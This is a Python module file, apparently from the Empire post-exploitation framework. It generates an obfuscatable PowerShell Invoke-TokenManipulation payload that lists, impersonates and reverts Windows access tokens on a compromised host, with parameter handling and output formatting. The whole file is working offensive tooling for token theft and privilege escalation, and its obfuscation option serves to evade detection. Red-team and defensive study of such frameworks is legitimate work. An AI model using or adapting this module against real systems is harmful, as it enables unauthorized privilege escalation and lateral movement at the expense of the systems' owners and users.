from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = "Invoke-TokenManipulation"

        outputf = params.get("OutputFunction", "Out-String")

        if params["RevToSelf"].lower() == "true":
            script_end += " -RevToSelf"
        elif params["WhoAmI"].lower() == "true":
            script_end += " -WhoAmI"
        elif params["ShowAll"].lower() == "true":
            script_end += " -ShowAll"
            script_end += (
                f" | {outputf} | "
                + '%{$_ + "`n"};"`n'
                + str(module.name.split("/")[-1])
                + ' completed!"'
            )
        else:
            for option, values in params.items():
                if option.lower() != "agent" and option.lower() != "outputfunction":
                    if values and values != "":
                        if values.lower() == "true":
                            # if we're just adding a switch
                            script_end += " -" + str(option)
                        else:
                            script_end += " -" + str(option) + " " + str(values)

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith(
                "-ShowAll"
            ):
                script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize"
                script_end += (
                    f" | {outputf} | "
                    + '%{$_ + "`n"};"`n'
                    + str(module.name.split("/")[-1])
                    + ' completed!"'
                )
            else:
                script_end += (
                    f" | {outputf} | "
                    + '%{$_ + "`n"};"`n'
                    + str(module.name.split("/")[-1])
                    + ' completed!"'
                )
                if params["RevToSelf"].lower() != "true":
                    script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
